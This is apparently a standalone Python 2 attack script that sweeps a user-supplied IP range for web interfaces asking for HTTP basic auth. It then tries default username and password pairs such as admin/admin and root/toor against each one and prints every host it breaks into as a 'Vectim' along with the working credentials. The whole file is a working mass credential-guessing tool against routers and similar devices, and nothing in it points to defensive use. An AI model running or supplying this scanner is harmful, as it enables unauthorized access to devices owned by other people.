#!/usr/bin/python

from socket import * 
import socket 
import string  
from termcolor import colored , cprint 
import urllib 
import urllib2 
import requests

def up (host):
  try:
      r = requests.head("http://%s/"%(host),timeout=0.09)
      if (r.status_code == 401):
      	return True
      else:
        return False
  except requests.ConnectionError:
        return False
  except requests.exceptions.ReadTimeout:
  	    return False


def vulner (host,user,passwd):
  try:	
	r = requests.get("http://%s/"%(host), auth=(user, passwd),timeout=0.09)
	if (r.status_code==200):
		return True
	else:
		return False
  except requests.ConnectionError:
  	return False
  except requests.exceptions.ReadTimeout:
  	    return False      


username = ["admin","user","username","1234","ADSL","root",
            "tech","adm","manager","operator","security"]


password = ["admin","","user","username","ADSL","1234","operator","security","tech","manager"
            "adm","root","toor","1234admin","PASSWORD"]

intro = '''

 _      sunakida@live.fr      _____     _           
(_)__   __ _  __ _  ___      | ____|___| |__   ___  
| / __|/ _` |/ _` |/ __|     |  _| / __| '_ \ / _ \ 
| \__ \ (_| | (_| | (__      | |__| (__| | | | (_) |
|_|___/\__,_|\__,_|\___|     |_____\___|_| |_|\___/  
                                                


'''

cprint (intro,'red',attrs=['bold'])

cprint ('You Want To test From  :  ','green',attrs=['bold'],end = "") ; address1 = raw_input ()

cprint ('=================> To  :  ','green',attrs=['bold'],end = "") ; address2 = raw_input ()




Host1 = address1.split('.')
Host1[3] = int (Host1[3])
Host1[2] = int (Host1[2])

Host2 = address2.split('.')
Host2[2] = int(Host2[2])
Host2[3] = int (Host2[3])
while  Host1[2] < Host2[2]:

     while Host1[3] <= 255:
         Host1[3] = str(Host1[3])
         Host1[2] = str(Host1[2])
         hosup = ('.').join(Host1)
         
         if up(hosup):
         	for userz in username:
         		for passw in password:
         			if vulner(hosup, userz, passw):

         				cprint ("We have  A new  Vectim  :%s"%(hosup),'green',attrs=['bold'])
         				print "\n"
         				cprint ("username is ==> %s"%(userz),'red',attrs=['bold'])
         				print "\n"
         				cprint ("password is ==> %s"%(passw),'red',attrs=['bold'])
         				print "\n"


         Host1[3] = int (Host1[3])
         Host1[3] +=1
     Host1[3] =0
     Host1[2] = int(Host1[2])
     Host1[2]+=1

Host1[2] = str(Host1[2])
while Host1[3]<=Host2[3]:
	Host1[3] = str(Host1[3])
	hosup = ('.').join(Host1)


	if up(hosup):
         	for userz in username:
         		for passw in password:
         			if vulner(hosup, userz, passw):
         				cprint ("We have  A new  Vectim  :%s"%(hosup),'green',attrs=['bold'],end = "")
         				print "\n"
         				cprint ("username is ==> %s"%(userz),'red',attrs=['bold'],end = "")
         				print "\n"
        				cprint ("password is ==> %s"%(passw),'red',attrs=['bold'],end = "")
        				print "\n"

	Host1[3] = int (Host1[3])
	Host1[3] +=1

